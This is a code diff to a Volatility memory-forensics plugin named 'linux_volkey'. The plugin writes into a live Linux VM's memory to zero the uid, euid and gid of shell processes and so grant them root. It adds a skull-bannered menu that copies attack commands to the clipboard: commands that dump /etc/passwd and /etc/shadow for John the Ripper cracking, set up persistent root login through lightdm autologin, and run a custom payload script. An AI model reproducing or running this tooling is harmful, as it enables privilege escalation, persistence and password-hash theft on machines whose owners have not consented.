@@ -10,22 +10,72 @@ import subprocess as sp
 import re
 from volatility.renderers import TreeGrid
 from volatility.renderers.basic import Address
+from subprocess import Popen, PIPE
+import shlex
+import os
 
+charReaderFlag = True
+try:
+    import readchar
+except ImportError, e:
+    try:
+        import pip
+        pip.main(['install', package])
+    except:
+        charReaderFlag = False
 
 class linux_volkey(linux_common.AbstractLinuxCommand):
     """Gather active tasks by walking the task_struct->task list"""
+    def run(self, cmd):
+        """Runs the given command locally and returns the output, err and exit_code."""
+        if "|" in cmd:      
+            cmd_parts = cmd.split('|')
+        else:
+            cmd_parts = []
+            cmd_parts.append(cmd)
+        i = 0
+        p = {}
+        for cmd_part in cmd_parts:
+            cmd_part = cmd_part.strip()
+            if i == 0:
+                p[i]=Popen(shlex.split(cmd_part),stdin=None, stdout=PIPE, stderr=PIPE)
+            else:
+                p[i]=Popen(shlex.split(cmd_part),stdin=p[i-1].stdout, stdout=PIPE, stderr=PIPE)
+            i = i +1
+        (output, err) = p[i-1].communicate()
+        exit_code = p[0].wait()
+
+        return str(output), str(err), exit_code
+
 
     def _get_cred_offsets_brute(self, pid):
         _prof = self._config.PROFILE
         _loc = self._config.LOCATION[7::]
         '''return dict containing uid and euid mem locations '''
-        cmd = 'printf \"cc(pid={pid}); dt(\\\"cred\\\",proc().cred)\" | python vol.py --profile={prof} -f {loc} linux_volshell'.format(pid=pid, prof=_prof,loc=_loc)
-        res = sp.check_output(cmd,shell=True)
+        cmd = 'echo \"cc(pid='+str(pid)+'); dt(\\\"cred\\\",proc().cred)\" | python '+sys.argv[0]+' --profile='+str(_prof)+' -f '+str(_loc)+' linux_volshell'
+        cmd = cmd.replace("%20", "\\ ")
+        #print cmd
+        output = ""
+        err = ""
+        exit_code = ""
+        output, err, exit_code = self.run(cmd)
+
+        if exit_code != 0:
+            print "Output:"
+            print output
+            print "Error:"
+            print err
+        # Handle error here
+        # else:
+        # Be happy :D
+        # print output
+        res = output
         rtn = {}
         rtn['pid'] = str(pid)
         u = re.compile('\\b\uid\\b')
         e = re.compile('\\b\euid\\b')
         g = re.compile('\\b\gid\\b')
+        # print(res)
         for line in res.split('\n'):
             if u.search(line):
                 rtn['uid'] = line.split()[3]
@@ -36,19 +86,37 @@ class linux_volkey(linux_common.AbstractLinuxCommand):
         return rtn
 
     def _overwrite_UIDs(self,IDs):
-        uid = IDs['uid']
-        euid = IDs['euid']
-        pid = IDs['pid']
-        gid = IDs['gid']
+        try:
+            uid = IDs['uid']
+            euid = IDs['euid']
+            pid = IDs['pid']
+            gid = IDs['gid']
+        except:
+            print("Fatal Error: failed to find Mem location of ID values")
+            sys.exit(2)
         _prof = self._config.PROFILE
         _loc = self._config.LOCATION[7::]
         zeros = '\\x00\\x00\\x00\\x00'
-        cmd = 'printf \"Yes, I want to enable write support\nself._addrspace.write({uid},\'{zeros}\'); self._addrspace.write({euid},\'{zeros}\'); self._addrspace.write({gid},\'{zeros}\')\" | python vol.py --profile={prof} -f {loc} linux_volshell --write'.format(uid=uid,zeros=zeros,euid=euid, prof=_prof,loc=_loc, pid=pid, gid=gid)
-        res = sp.check_output(cmd,shell=True)
-        print res
+        cmd = 'echo \"Yes, I want to enable write support\nself._addrspace.write({uid},\'{zeros}\'); self._addrspace.write({euid},\'{zeros}\'); self._addrspace.write({gid},\'{zeros}\')\" | python {arg} --profile={prof} -f {loc} linux_volshell --write'.format(uid=uid,zeros=zeros,euid=euid, prof=_prof,loc=_loc, pid=pid, gid=gid,arg=sys.argv[0])
+        cmd = cmd.replace("%20", "\\ ")
+
+        #print cmd
+        output, err, exit_code = self.run(cmd)
+
+        if exit_code != 0:
+            print "Output:"
+            print output
+            print "Error:"
+            print err
+            return False
+
+        # Handle error here
+        # else:
+        # Be happy :D
+            # print output
+        res = output
         rtn = True
         return rtn
-
 
     def __init__(self, config, *args, **kwargs):
         linux_common.AbstractLinuxCommand.__init__(self, config, *args, **kwargs)
@@ -142,7 +210,65 @@ class linux_volkey(linux_common.AbstractLinuxCommand):
                        Address(dtb),
                        start_time])
 
+    def skull(self):
+        print('''
+                             uuuuuuu
+                         uu$$$$$$$$$$$uu
+                      uu$$$$$$$$$$$$$$$$$uu
+                     u$$$$$$$$$$$$$$$$$$$$$u
+                    u$$$$$$$$$$$$$$$$$$$$$$$u
+                   u$$$$$$$$$$$$$$$$$$$$$$$$$u
+                   u$$$$$$$$$$$$$$$$$$$$$$$$$u
+                   u$$$$$$"   "$$$"   "$$$$$$u
+                   "$$$$"      u$u       $$$$"
+                    $$$u       u$u       u$$$
+                    $$$u      u$$$u      u$$$
+                     "$$$$uu$$$   $$$uu$$$$"
+                      "$$$$$$$"   "$$$$$$$"
+                        u$$$$$$$u$$$$$$$u
+                         u$"$"$"$"$"$"$u
+         u$u.            $$u$ $ $ $ $u$$            .u$u
+        .u$$$$uu.         $$$$$u$u$u$$$         .uu$$$$u.
+       .u$""u$$u$$u.       "$$$$$$$$$"       .u$$u$$u""$u.
+      .uu  .u$"  "u$$$u       """""       u$$$u"  "$u.  uu.
+          "u"        u$$$u.           .u$$$u        "u"
+                        "$$$u.     .u$$$"
+                            "$$$u. """
+           .uuuu.         .uuu. "$$$u.         .uuuu.
+          u"    "u.   .u$$$""      ""$$$u.   .u"    "u
+          .u    .u$uu$$""              ""$$uu$u.    .u
+        ."u$$uu$$$$uu.                    .uu$$$$uu$$u".
+       .u"   "u$$"   "$u                u$"   "$$u"   "u.
+        $.    .uu.    .u                u.    .uu.    .$
+         "u..u"  "u..u"                  "u..u"  "u..u"
 
+
+                     Welcome to Vol-Key
+        ''')
+    def keyMenu(self):
+        print("""
+    1. Get Hashes (requires internet)
+    2. Get Hashes (requires shared folder)
+    3. Persistent root
+    4. Run your own payload
+    i. info
+    e. Exit
+        """)
+
+    def readIn(self,validSelec):
+        while(1):
+            if(charReaderFlag == True):
+                temp = readchar.readkey()
+            else:
+                try:
+                    temp = str(raw_input("--> "))
+                except:
+                    continue
+            if len(temp) == 1: #this will ignore special keys that require >1 byte (arrow keys, modifiers,ect.)
+                if temp in validSelec:
+                    return temp
+        print("fatal flaw on read")
+        sys.exit(2) #error code 2 for standard input error code                                                                                    
     def render_text(self, outfd, data):
         self.table_header(outfd, [("Offset", "[addrpad]"),
                                   ("Name", "20"),
@@ -164,8 +290,69 @@ class linux_volkey(linux_common.AbstractLinuxCommand):
                                str(gid),
                                dtb,
                                str(start_time))
+                print "running exploit..."
                 vals = self._get_cred_offsets_brute(task.pid)
+                # print vals
+                #success = True
                 success = self._overwrite_UIDs(vals)
+                if success:
+                    print "got root for shell with PID="+str(task.pid)+"...probably"
+                else:
+                    print "failed to get root for shell with PID="+str(task.pid)
+        self.skull()
+        while(1):
+            self.keyMenu();
+            print("select an option:")
+            keySelec = ['e','i','1','2','3','4']
+            ans=self.readIn(keySelec)
+            print("option selected: "+ans+"\n")
+            if ans=="1": 
+                data = "cd /mnt/hgfs/payloads && apt update && apt install john -y && unshadow /etc/passwd /etc/shadow > crackMe.db"
+                os.system("echo '%s' | pbcopy" % data)
+                print("Payload copied to clipboard")
+                print("Click paste in terminal, and run the command to execute the payload")
+            elif ans=="2": 
+                data = "cd /mnt/hgfs/payloads && sudo dpkg -i john*.deb && unshadow /etc/passwd /etc/shadow > crackMe.db"
+                os.system("echo '%s' | pbcopy" % data)
+                print("Payload copied to clipboard")
+                print("Click paste in terminal, and run the command to execute the payload")
+            elif ans=="3":
+                data = "passwd root && usermod -U root && printf \"[Seat:*]\nautologin-user=root\" > /etc/lightdm/lightdm.conf"
+                os.system("echo '%s' | pbcopy" % data)
+                print("Payload copied to clipboard")
+                print("Click paste in terminal, and run the command to execute the payload")
+            elif ans=="4": 
+                data = "chmod +x /mnt/hgfs/payloads/payload.sh && ./mnt/hgfs/payloads/payload.sh"
+                os.system("echo '%s' | pbcopy" % data)
+                print("Payload copied to clipboard")
+                print("Click paste in terminal, and run the command to execute the payload")
+            elif ans=="i": 
+                print("""
+----------------------------------------------------------------------------
+    option | info
+----------------------------------------------------------------------------
+ 1. | gets Hashes from target using the apt-get
+    | version of John the ripper.
+    | Requres internet access or a pre installed copy of John
+    |
+ 2. | gets Hashes from target using a version of John
+    | the ripper via the "payloads" shared folder
+    | 
+ 3. | Override Lightdm config to always log in as 
+    | root at startup
+    |
+ 4. | runs custom payload on target using a version of John
+    | the ripper via the "payloads" shared folder
+----------------------------------------------------------------------------
+         """)
+            elif ans=="e":
+                print("\n Goodbye")
+                ans=None
+                break
+            else:
+                print("\n Pick a Real Option.") 
 
 
-	
+
+
+  
